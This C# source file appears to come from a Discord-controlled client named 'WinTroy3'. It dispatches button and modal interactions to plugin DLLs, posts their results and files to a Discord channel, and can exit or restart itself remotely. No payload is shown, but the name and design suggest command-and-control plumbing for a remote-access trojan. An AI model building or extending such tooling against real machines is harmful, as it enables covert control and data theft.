using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http.Headers;
using System.Runtime.Remoting.Channels;
using System.Text;
using System.Threading.Tasks;
using WinTroy3_PluginLib;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Window;
using static WinTroy3_Client.Menu.Plugins;

namespace WinTroy3_Client.Menu
{
    public class ButtonHandler
    {
        public static void SetLastChannel(ISocketMessageChannel channel, SocketUser user)
        {
            Bot._lastChannel = channel;
            Bot._lastUser = user;
        }

        public static async Task ModalSubmittedAsync(SocketModal modal)
        {
            await Task.Run(async () =>
            {
                SetLastChannel(modal.Channel, modal.User);

                string customId = modal.Data.CustomId;

                int index = ModalIDs.IndexOf(customId);

                Control.Log($"{customId} => {index}:{ModalResults.Count}");

                if (index == -1)
                    throw new Exception("The submitted Modal has no implemented functionality.");

                ModalResult modalResult = ModalResults[index];

                string dllFilePath = modalResult.DllFileName;

                var result = Compiler.RunModal(modalResult, dllFilePath, modal);

                var embed = new EmbedBuilder()
                            .WithTitle(result.RespondTitle)
                            .WithDescription(result.RespondText)
                            .WithColor(Color.Purple)
                            .Build();

                var componentBuilder = new ComponentBuilder();

                if (result.RespondButtons != null)
                    foreach (string _button in result.RespondButtons)
                        componentBuilder.WithButton(_button, _button);

                var components = componentBuilder.Build();

                if (result.RespondFiles != null)
                    await modal.RespondWithFilesAsync(
                        result.RespondFiles,
                        embed: embed,
                        components: components);
                else if (result.RespondFile != null)
                    await modal.RespondWithFileAsync(
                        result.RespondFile,
                        embed: embed,
                        components: components);
                else
                    await modal.RespondAsync(
                        embed: embed,
                        components: components);
            });
        }

        public static async Task HandleInteractionAsync(SocketInteraction interaction)
        {
            await Task.Run(async () =>
            {
                Control.Log(interaction.Id);

                if (interaction is SocketMessageComponent componentInteraction)
                {
                    if (componentInteraction.Data is SocketMessageComponentData buttonData)
                    {
                        string customId = buttonData.CustomId;

                        if (await RunIntegrated(customId, interaction: interaction))
                            return;

                        Control.Log(customId);

                        await interaction.DeferAsync();

                        if (customId.StartsWith("_menu_"))
                            return;

                        SetLastChannel(interaction.Channel, interaction.User);
                        var result = GetData(customId);

                        Modal modal = result.Respond.RespondModal;

                        if (modal != null)
                        {
                            await FollowupModal.Show(modal, interaction);
                            return;
                        }

                        if (result.Respond.RespondFiles != null)
                            await interaction.FollowupWithFilesAsync(
                                result.Respond.RespondFiles,
                                embed: result.Embed,
                                components: result.Components);
                        else if (result.Respond.RespondFile != null)
                            await interaction.FollowupWithFileAsync(
                                result.Respond.RespondFile,
                                embed: result.Embed,
                                components: result.Components);
                        else
                            await interaction.FollowupAsync(
                                embed: result.Embed,
                                components: result.Components);
                    }
                }
            });
        }

        public static (
            MessageComponent Components,
            Embed Embed,
            Respond Respond)
            GetData(string customId)
        {
            int index = IDs.IndexOf(customId);

            if (index == -1)
                throw new Exception("Command not found.");

            Control.Log($"{customId} {index}");

            Plugin button = MenuButtons[index];

            string dllFilePath = button.DllFileName;

            Respond result = Compiler.Run(button, dllFilePath);

            Modal modal = result.RespondModal;

            if (modal != null)
                return (null, null, result);

            var text = result.RespondText;

            if (text.Length > 4096)
            {
                var filePath = Config.PathConfig.GetTempPath() + Control.GetRandomString() + ".txt";
                File.WriteAllText(filePath, text);
                var files = result.RespondFiles == null ? new List<FileAttachment>() : result.RespondFiles.ToList();
                files.Add(new FileAttachment(filePath));
                result.RespondFiles = files;
                text = string.Empty;
            }

            var embed = new EmbedBuilder()
                .WithTitle(result.RespondTitle)
                .WithDescription(text)
                .WithColor(Color.Purple)
                .Build();

            var componentBuilder = new ComponentBuilder();

            if (result.RespondSelectMenu != null)
                componentBuilder.WithSelectMenu(result.RespondSelectMenu);

            if (result.RespondButtons != null)
                foreach (string _button in result.RespondButtons)
                {
                    Control.Log($"{_button} {result.RespondButtons.Length} {IDs.Count}");
                    try
                    {
                        var plugin = MenuButtons[IDs.IndexOf(_button)];
                        componentBuilder.WithButton(plugin.ButtonLabel, _button);
                    }
                    catch { }
                }

            var components = componentBuilder.Build();

            return (components, embed, result);
        }

        public static async Task<bool> RunIntegrated(
            string customId,
            SocketInteraction interaction = null,
            SocketUserMessage message = null)
        {
            var reply = new FollowupModal.ReplyTo(interaction, message);
            if (customId == "end")
            {
                var embed = new EmbedBuilder()
                    .WithTitle("End")
                    .WithDescription("The application will end now.")
                    .WithColor(Color.Green)
                    .WithThumbnailUrl(Bot.GetIcon("shutdown"))
                    .Build();
                await reply.Reply(embed);
                Environment.Exit(0);
            }
            else if (customId == "restart")
            {
                var embed = new EmbedBuilder()
                    .WithTitle("Restart")
                    .WithDescription("The application will restart now.")
                    .WithThumbnailUrl(Bot.GetIcon("restart"))
                    .WithColor(Color.Green)
                    .Build();
                await reply.Reply(embed);
                Process.Start(Process.GetCurrentProcess().MainModule.FileName);
            }
            else if (customId == "showfollowupmodal" && interaction != null)
                await interaction.RespondWithModalAsync(FollowupModal.followupModal);
            else
                return false;
            return true;
        }

        public static async Task AddFiles(
            IMessageChannel channel,
            Respond respond,
            string name)
        {
            var embed = new EmbedBuilder()
                .WithColor(Color.Green)
                .WithTitle("Delivery")
                .WithThumbnailUrl(Bot.GetIcon("files"));
            var files = respond.RespondFiles;
            var filesCount = files == null ? 0 : files.Count();
            var aFileMessage = $"The {name} function sent a file for you";
            if (respond.RespondFile != null)
                await channel.SendFileAsync(
                    respond.RespondFile,
                    embed: embed.WithDescription(aFileMessage).Build());
            else if (files != null)
                await channel.SendFilesAsync(
                    files,
                    embed: embed.WithDescription(
                        filesCount == 1 ? aFileMessage : $"The {name} function sent {filesCount} files for you")
                    .Build());
        }
        
        public static async Task<Respond> Run(string customId, SocketUserMessage message)
        {
            SetLastChannel(message.Channel, message.Author);

            if (await RunIntegrated(customId, message: message))
                return null;
            
            var result = GetData(customId);

            var respond = result.Respond;

            if (respond.RespondModal != null)
                return respond;

            var data = await message.ReplyAsync(
                embed: result.Embed,
                components: result.Components);

            await AddFiles(data.Channel, respond, customId);

            return respond;
        }
    }
}
